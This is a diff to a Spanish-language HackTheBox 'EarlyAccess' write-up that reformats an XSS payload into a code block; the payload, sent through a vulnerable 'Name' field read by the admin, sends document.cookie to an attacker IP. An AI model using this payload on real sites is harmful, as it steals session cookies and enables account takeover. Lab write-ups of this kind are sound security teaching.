@@ -200,7 +200,11 @@ debido a que el campo **`Name`** es vulnerable a XSS y será el que lea el admin
 ![XSS](/assets/images/hackthebox/machines/earlyaccess/xss1.png)
 
 El payload que estaremos utilizando es el siguiente:
-> <script>var i=new Image; i.src="https://10.10.16.29:4443/?"+document.cookie;</script>
+{% raw %}
+~~~html
+<script>var i=new Image; i.src="https://10.10.16.29:4443/?"+document.cookie;</script>
+~~~
+{% endraw %}
 
 ![XSS](/assets/images/hackthebox/machines/earlyaccess/xss2.png)
 
